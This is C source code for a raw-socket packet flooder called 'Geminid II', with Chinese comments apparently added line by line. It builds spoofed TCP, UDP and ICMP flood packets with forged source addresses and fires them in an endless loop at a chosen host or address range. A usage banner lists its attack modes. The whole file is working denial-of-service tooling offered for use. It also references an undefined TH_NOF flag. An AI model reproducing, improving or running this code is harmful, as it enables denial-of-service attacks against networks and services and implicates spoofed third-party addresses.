#include <stdio.h>          // 标准输入输出头文件
#include <stdlib.h>         // 标准库头文件，包含内存分配函数等
#include <unistd.h>         // Unix标准函数头文件
#include <netdb.h>          // 网络数据库头文件
#include <sys/types.h>      // 系统类型定义

#ifdef F_PASS
#include <sys/stat.h>       // 文件状态头文件（条件编译）
#endif

#include <netinet/in_systm.h>// Internet系统头文件
#include <sys/socket.h>      // Socket编程头文件
#include <string.h>          // 字符串处理头文件
#include <time.h>            // 时间处理头文件

#ifndef __USE_BSD
#define __USE_BSD           // 定义使用BSD特性
#endif

#ifndef __FAVOR_BSD
#define __FAVOR_BSD         // 偏好使用BSD特性
#endif

#include <netinet/in.h>     // Internet网络接口头文件
#include <netinet/ip.h>     // Internet协议头文件
#include <netinet/tcp.h>    // TCP协议头文件
#include <netinet/udp.h>    // UDP协议头文件
#include <netinet/ip_icmp.h>// ICMP协议头文件
#include <arpa/inet.h>      // ARPANET网络接口头文件

// 定义htons宏，适用于非Linux系统
#ifdef LINUX
#define FIX(x) htons(x)
#else
#define FIX(x) (x)
#endif

/* Geminid attack flags */
#define TCP_ACK 1           // TCP ACK 标志
#define TCP_FIN 2           // TCP FIN 标志
#define TCP_SYN 4           // TCP SYN 标志
#define TCP_RST 8           // TCP RST 标志
#define UDP_CFF 16          // UDP 攻击标志
#define ICMP_ECHO_G 32      // ICMP 回显请求标志
#define TCP_NOF 64          // TCP 无标志攻击

/* Check if any of the TCP flags are set */
#define TCP_ATTACK() (a_flags & TCP_ACK || \
                      a_flags & TCP_FIN || \
                      a_flags & TCP_SYN || \
                      a_flags & TCP_RST || \
                      a_flags & TCP_NOF)

/* Check if UDP attack flag is set */
#define UDP_ATTACK() (a_flags & UDP_CFF)
/* Check if ICMP attack flag is set */
#define ICMP_ATTACK() (a_flags & ICMP_ECHO_G)

/* Choose destination port randomly or within specified range */
#define CHOOSE_DST_PORT() dst_sp == 0 ? random() : htons(dst_sp + (random() % (dst_ep - dst_sp + 1)));

/* Choose source port randomly or within specified range */
#define CHOOSE_SRC_PORT() src_sp == 0 ? random() : htons(src_sp + (random() % (src_ep - src_sp + 1)));

/* Function to send the constructed packet */
#define SEND_PACKET()                      \
    if (sendto(rawsock,                    \
               &packet,                    \
               (sizeof packet),            \
               0,                          \
               (struct sockaddr *)&target, \
               sizeof target) < 0)         \
    {                                      \
        perror("sendto");                  \
        exit(-1);                          \
    }

/* Linux / SunOS x86 / FreeBSD */
// #define BANNER_CKSUM 54018

/* SunOS Sparc */
#define BANNER_CKSUM 723

u_long lookup(const char *host);
unsigned short in_cksum(unsigned short *addr, int len);
static void inject_iphdr(struct ip *ip, u_char p, u_char len);
char *class2ip(const char *class);
static void send_tcp(u_char th_flags);
static void send_udp(u_char garbage);
static void send_icmp(u_char garbage);
char *get_plain(const char *crypt_file, const char *xor_data_key);
static void usage(const char *argv0);

u_long dstaddr;             // 目标地址
u_short dst_sp, dst_ep;     // 目标端口范围
u_short src_sp, src_ep;     // 源端口范围
char *src_class;            // 源IP地址类C表示
char *dst_class;            // 目标IP地址类C表示
int a_flags;                // 攻击标志位
int rawsock;                // 原始套接字描述符
struct sockaddr_in target;  // 目标地址结构

/* Self promotion :) */
const char *banner = "Geminid II. by live [TCP/UDP/ICMP Packet flooder]";

struct pseudo_hdr
{                        /* See RFC 793 Pseudo Header */
    u_long saddr, daddr; /* source and dest address   */
    u_char mbz, ptcl;    /* zero and protocol         */
    u_short tcpl;        /* tcp length                */
};

struct cksum
{
    struct pseudo_hdr pseudo;
    struct tcphdr tcp;
};

struct
{
    int gv; /* Geminid value */
    int kv; /* Kernel value */
    void (*f)(u_char); /* 指向发送函数的指针 */
} a_list[] = {

    /* TCP */
    {TCP_ACK, TH_ACK, send_tcp}, // TCP ACK
    {TCP_FIN, TH_FIN, send_tcp}, // TCP FIN
    {TCP_SYN, TH_SYN, send_tcp}, // TCP SYN
    {TCP_RST, TH_RST, send_tcp}, // TCP RST
    {TCP_NOF, TH_NOF, send_tcp}, // TCP 无标志攻击

    /* UDP */
    {UDP_CFF, 0, send_udp},      // UDP攻击

    /* ICMP */
    {ICMP_ECHO_G, ICMP_ECHO, send_icmp}, // ICMP回显请求
    {0, 0, (void *)NULL},         // 结束标志
};

int main(int argc, char *argv[])
{
    int n, i, on = 1;
    int b_link;
#ifdef F_PASS
    struct stat sb;
#endif
    unsigned int until;

    a_flags = dstaddr = i = 0;
    dst_sp = dst_ep = src_sp = src_ep = 0;
    until = b_link = -1;
    src_class = dst_class = NULL;
    while ((n = getopt(argc, argv, "T:UINs:h:d:p:q:l:t:")) != -1)
    {
        char *p;

        switch (n)
        {
        case 'T': /* TCP attack
                   *
                   * 0: ACK
                   * 1: FIN
                   * 2: RST
                   * 3: SYN
                   */

            switch (atoi(optarg))
            {
            case 0:
                a_flags |= TCP_ACK; // 设置TCP ACK标志
                break;
            case 1:
                a_flags |= TCP_FIN; // 设置TCP FIN标志
                break;
            case 2:
                a_flags |= TCP_RST; // 设置TCP RST标志
                break;
            case 3:
                a_flags |= TCP_SYN; // 设置TCP SYN标志
                break;
            }
            break;

        case 'U': /* UDP attack
                   */
            a_flags |= UDP_CFF; // 设置UDP攻击标志
            break;

        case 'I': /* ICMP attack
                   */
            a_flags |= ICMP_ECHO_G; // 设置ICMP回显请求标志
            break;

        case 'N': /* Bogus No flag attack (TCP)
                   */
            a_flags |= TCP_NOF; // 设置TCP无标志攻击
            break;

        case 's':
            src_class = optarg; // 设置源地址类C表示
            break;

        case 'h':
            dstaddr = lookup(optarg); // 设置目标地址
            break;

        case 'd':
            dst_class = optarg;
            i = 1; /* neat flag to check command line later */ // 用于检查命令行参数的标志
            break;

        case 'p':
            if ((p = (char *)strchr(optarg, ',')) == NULL)
                usage(argv[0]); // 如果没有逗号分隔，则显示用法信息
            dst_sp = atoi(optarg); /* Destination start port */ // 设置目标开始端口
            dst_ep = atoi(p + 1);  /* Destination end port */ // 设置目标结束端口
            break;

        case 'q':
            if ((p = (char *)strchr(optarg, ',')) == NULL)
                usage(argv[0]); // 如果没有逗号分隔，则显示用法信息
            src_sp = atoi(optarg); /* Source start port */ // 设置源开始端口
            src_ep = atoi(p + 1);  /* Source end port */ // 设置源结束端口
            break;

        case 'l':
            b_link = atoi(optarg);
            if (b_link <= 0 || b_link > 100)
                usage(argv[0]); // 如果链路控制百分比不在有效范围内，则显示用法信息
            break;

        case 't':
            until = time(0) + atoi(optarg); // 设置攻击持续时间
            break;

        default:
            usage(argv[0]); // 默认情况下显示用法信息
            break;
        }
    }

    /* Checking command line */
    if ((!dstaddr && !i) ||
        (dstaddr && i) ||
        (!TCP_ATTACK() && !UDP_ATTACK() && !ICMP_ATTACK()) ||
        (src_sp != 0 && src_sp > src_ep) ||
        (dst_sp != 0 && dst_sp > dst_ep))
        usage(argv[0]);

    srandom(time(NULL) ^ getpid()); // 设置随机种子

    /* Opening RAW socket */
    if ((rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("socket");
        exit(-1);
    }

    if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL,
                   (char *)&on, sizeof(on)) < 0)
    {
        perror("setsockopt");
        exit(-1);
    }

    /* Filling target structure */
    target.sin_family = AF_INET;

    /* Packeting! */
    for (n = 0;;)
    {

        /* Poor link control handling */
        if (b_link != -1 && random() % 100 + 1 > b_link)
        {
            if (random() % 200 + 1 > 199)
                usleep(1);
            continue;
        }

        /* Sending requested packets */
        for (i = 0; a_list[i].f != NULL; ++i)
        {
            if (a_list[i].gv & a_flags)
                a_list[i].f(a_list[i].kv);
        }

        /* Attack is finished? Do not check it every time, would eat
         * too much CPU */
        if (n++ == 100)
        {
            if (until != -1 && time(0) >= until)
                break;
            n = 0;
        }
    }

    exit(0);
}

u_long lookup(const char *host)
{
    struct hostent *hp;

    if ((hp = gethostbyname(host)) == NULL)
    {
        perror("gethostbyname"); // 获取主机名失败
        exit(-1);
    }

    return *(u_long *)hp->h_addr; // 返回主机地址
}

#define RANDOM() (int)random() % 255 + 1

char *class2ip(const char *class)
{
    static char ip[16];
    int i, j;

    for (i = 0, j = 0; class[i] != '\0'; ++i)
        if (class[i] == '.') // 计算IP地址中的点数
            ++j;

    switch (j)
    {
    case 0:
        sprintf(ip, "%s.%d.%d.%d", class, RANDOM(), RANDOM(), RANDOM()); // 构造IP地址
        break;
    case 1:
        sprintf(ip, "%s.%d.%d", class, RANDOM(), RANDOM()); // 构造IP地址
        break;
    case 2:
        sprintf(ip, "%s.%d", class, RANDOM()); // 构造IP地址
        break;

    /* Spoofing single host */
    default:
        strncpy(ip, class, 16); // 复制单一主机IP地址
        break;
    }
    return ip;
}

unsigned short in_cksum(unsigned short *addr, int len)
{
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)
    {
        sum += *w++; // 加入16位单词
        nleft -= 2;
    }

    /*
     * Mop up an odd byte, if necessary
     */
    if (nleft == 1)
    {
        *(unsigned char *)(&answer) = *(unsigned char *)w; // 处理奇数字节
        sum += answer;
    }

    /*
     * Add back carry outs from top 16 bits to low 16 bits
     */
    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */ // 加入高16位到低16位
    sum += (sum >> 16);                 /* add carry           */ // 加入进位
    answer = ~sum;                      /* truncate to 16 bits */ // 截断为16位

    return answer;
}

/*
 * Creating generic ip header, not yet ready to be used.
 */
static void inject_iphdr(struct ip *ip, u_char p, u_char len)
{
    /* Filling IP header */
    ip->ip_hl = 5; // IP头长度
    ip->ip_v = 4; // IP版本号
    ip->ip_p = p; // 协议类型
    ip->ip_tos = 0x08; /* 0x08 */ // 类型服务
    ip->ip_id = random(); // 随机ID
    ip->ip_len = len; // 总长度
    ip->ip_off = 0; // 分段偏移
    ip->ip_ttl = 255; // 生存时间

    ip->ip_dst.s_addr = dst_class != NULL ? inet_addr(class2ip(dst_class)) : dstaddr; // 目标地址
    ip->ip_src.s_addr = src_class != NULL ? inet_addr(class2ip(src_class)) : random(); // 源地址

    /* I know, this is not part of the game, but anyway.. */
    target.sin_addr.s_addr = ip->ip_dst.s_addr; // 更新目标地址
}

static void send_tcp(u_char th_flags)
{
    struct cksum cksum;
    struct packet
    {
        struct ip ip;
        struct tcphdr tcp;
    } packet;

    /* Filling IP header */
    memset(&packet, 0, sizeof packet); // 清空数据包
    inject_iphdr(&packet.ip, IPPROTO_TCP, FIX(sizeof packet)); // 填充IP头
    packet.ip.ip_sum = in_cksum((void *)&packet.ip, 20); // 计算IP校验和

    /* Filling cksum pseudo header */
    cksum.pseudo.daddr = dstaddr; // 目标地址
    cksum.pseudo.mbz = 0; // 零
    cksum.pseudo.ptcl = IPPROTO_TCP; // 协议类型
    cksum.pseudo.tcpl = htons(sizeof(struct tcphdr)); // TCP长度
    cksum.pseudo.saddr = packet.ip.ip_src.s_addr; // 源地址

    /* Filling TCP header */
    packet.tcp.th_flags = 0; // TCP标志
    packet.tcp.th_win = htons(65535); // 窗口大小
    packet.tcp.th_seq = random(); // 序列号
    packet.tcp.th_ack = 0; // 确认号
    packet.tcp.th_flags = th_flags; // 设置TCP标志
    packet.tcp.th_off = 5; // 数据偏移
    packet.tcp.th_urp = 0; // 紧急指针
    packet.tcp.th_sport = CHOOSE_SRC_PORT(); // 选择源端口
    packet.tcp.th_dport = CHOOSE_DST_PORT(); // 选择目标端口
    cksum.tcp = packet.tcp; // 更新伪头
    packet.tcp.th_sum = in_cksum((void *)&cksum, sizeof(cksum)); // 计算TCP校验和
    SEND_PACKET(); // 发送数据包
}

static void send_udp(u_char garbage) /* No use for garbage here, just to remain */
{                        /* coherent with a_list[]                  */
    struct packet
    {
        struct ip ip;
        struct udphdr udp;
    } packet;

    /* Filling IP header */
    memset(&packet, 0, sizeof packet); // 清空数据包
    inject_iphdr(&packet.ip, IPPROTO_UDP, FIX(sizeof packet)); // 填充IP头
    packet.ip.ip_sum = in_cksum((void *)&packet.ip, 20); // 计算IP校验和

    /* Filling UDP header */
    packet.udp.uh_sport = CHOOSE_SRC_PORT(); // 选择源端口
    packet.udp.uh_dport = CHOOSE_DST_PORT(); // 选择目标端口
    packet.udp.uh_ulen = htons(sizeof packet.udp); // UDP长度
    packet.udp.uh_sum = 0; /* No checksum */ // 不计算校验和
    SEND_PACKET(); // 发送数据包
}

static void send_icmp(u_char gargabe) /* Garbage discarded again.. */
{
    struct packet
    {
        struct ip ip;
        struct icmp icmp;
    } packet;

    /* Filling IP header */
    memset(&packet, 0, sizeof packet); // 清空数据包
    inject_iphdr(&packet.ip, IPPROTO_ICMP, FIX(sizeof packet)); // 填充IP头
    packet.ip.ip_sum = in_cksum((void *)&packet.ip, 20); // 计算IP校验和

    /* Filling ICMP header */
    packet.icmp.icmp_type = ICMP_ECHO; // ICMP类型
    packet.icmp.icmp_code = 0; // ICMP代码
    packet.icmp.icmp_cksum = htons(~(ICMP_ECHO << 8)); // ICMP校验和
    SEND_PACKET(); // 发送数据包
}

static void usage(const char *argv0)
{
    printf("%s \n", banner); // 显示横幅
    printf("Usage: %s [-T -U -I -N -s -h -d -p -q -l -t]\n\n", argv0); // 显示用法

    printf("REGISTERED TO: seilaqm..\n\n");

    printf("    -T TCP attack [0:ACK, 1:FIN, 2:RST, 3:SYN]   (no default         )\n");
    printf("    -U UDP attack                                (no options         )\n");
    printf("    -I ICMP attack                               (no options         )\n");
    printf("    -N Bogus No flag attack                      (no options         )\n");
    printf("    -s source class/ip                           (defaults to random )\n");
    printf("    -h destination host/ip                       (no default         )\n");
    printf("    -d destination class                         (no default         )\n");
    printf("    -p destination port range [start,end]        (defaults to random )\n");
    printf("    -q source port range [start,end]             (defaults to random )\n");
    printf("    -l %% of box link to use                      (defaults to 100%%   )\n");
    printf("    -t timeout                                   (defaults to forever)\n");

    exit(-1);
}